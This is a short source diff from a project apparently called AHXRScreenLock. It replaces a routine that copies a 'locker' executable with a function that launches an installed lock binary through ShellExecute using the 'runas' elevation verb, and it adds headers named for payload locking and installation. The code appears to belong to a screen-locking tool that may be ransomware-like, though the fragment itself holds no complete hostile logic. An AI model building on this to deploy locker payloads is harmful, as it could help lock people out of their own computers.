@@ -20,33 +20,20 @@
 	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
 */
 //=======================================================
-#include <string>
-#include <fstream>
+#include						"stdafx.h"
+#include						"payload_lock.h"
+#include						"payload_install.h"
+#include						"resource1.h"
+#include						<Windows.h>
+#include						<string>
 
-#include "settings.h"
-#include "pack.h"
+using namespace					std;
 
-using namespace std;
-
-string LOCKER_FILE_NAME;
-
-void buildNewLocker(string fileName) {
-	ifstream
-		f_old;
-	ofstream
-		f_new;
-
-	puts(LOCKER_FILE_NAME.c_str());
-
-	f_old.open(LOCKER_FILE_NAME, ios::binary);
-	f_new.open(fileName, ios::binary);
-
-	f_new << f_old.rdbuf();
-
-	f_old.close();
-	f_new.close();
-}
-
-void setLockerFileName(string name) {
-	LOCKER_FILE_NAME = name;
+void loadLockScreen() {
+	string s_install = getInstallPath() + string("\\") + LOCKED_FILE_NAME;
+	ShellExecute(NULL, "runas", s_install.c_str(),
+		" c:\\temp\\report.txt",
+		NULL,                       
+		SW_SHOWNORMAL
+	);
 }
